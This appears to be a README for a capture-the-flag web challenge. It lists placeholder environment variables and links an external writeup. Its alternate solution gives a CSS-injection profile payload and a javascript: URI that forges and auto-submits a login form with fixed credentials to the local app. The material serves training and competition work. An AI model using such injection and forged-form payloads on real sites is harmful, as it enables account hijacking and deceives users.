Check out duckrice404's writeup here: <https://deyixtan.github.io/posts/wxmctf2023/web5-ourspace/>

Environment variables needed: 
`FLAG=wxmctf{theflag}`
`JWT_SECRET=somesecret`

Alternate Solution: (same idea, different method) 

Create an account with following profile: 
```html
<style>
p {
display: inline !important;
margin-top: -24rem;
position: absolute;
}
</style>
```

Then enter this in the research field: 
```js
javascript:{
var form = document.createElement("form");
form.method = "POST";
form.action = "http://127.0.0.1:3000/login";
var element1 = document.createElement("input"); 
var element2 = document.createElement("input");  
element1.value="123456";
element1.name="username";
form.appendChild(element1);  
element2.value="123456";
element2.name="password";
form.appendChild(element2);
document.body.appendChild(form);
form.submit();
}
```
